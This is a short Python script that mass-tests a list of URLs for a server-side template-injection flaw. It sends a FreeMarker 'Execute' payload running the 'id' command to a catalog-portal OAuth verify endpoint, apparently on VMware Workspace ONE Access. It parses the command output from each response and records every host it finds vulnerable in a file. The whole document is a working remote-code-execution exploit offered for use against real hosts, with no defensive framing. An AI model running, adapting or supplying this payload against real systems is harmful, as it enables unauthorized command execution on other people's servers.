import requests
import sys
import re
from urllib.parse import quote
import threading
import urllib3
urllib3.disable_warnings()


def scan(txt):
    # cmd="whoami"
    payload='/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b"freemarker%2etemplate%2eutility%2eExecute"%3fnew%28%29%28"id"%29%7d'
    # payload=quote(payload)
    # print(payload)
    f = open(txt)
    urllist = f.readlines()
    for url in urllist:
        url = url.strip('\r\n')
        url = url.strip('/')
        all =url+payload
        # url.strip()
        try:
            req =requests.get(all,verify=False,timeout=5)
            code = req.status_code
            rep = req.text
            re1 = re.compile(r'device id:(.*?),')
            rep2 = re1.findall(rep)
            # rep2 = str(rep2)
            # print(rep)
            com=rep2[0]
            if code == 400:
                print(url+"\t"+"[+]Vulnerable Command:"+com)
                # print(rep2[0])
                open('succ.txt','a').write(url+"\n")
            else:
                print(url+"\t"+"[-]Not Vulnerable")
        except requests.exceptions.RequestException:
            print(url+"\t"+"[-]timeout Please check the URL is OK")
            continue
        except:
            print(url+"\t"+"[-]error Please check the URL is OK")
            continue

# scan("url.txt")
if __name__ == '__main__' :
    try:
        cmd1 =sys.argv[1]
        t = threading.Thread(target=scan(cmd1))
        t.start()
    except:
        print('helpï¼š')
        print('python demo.py url.txt')
        pass
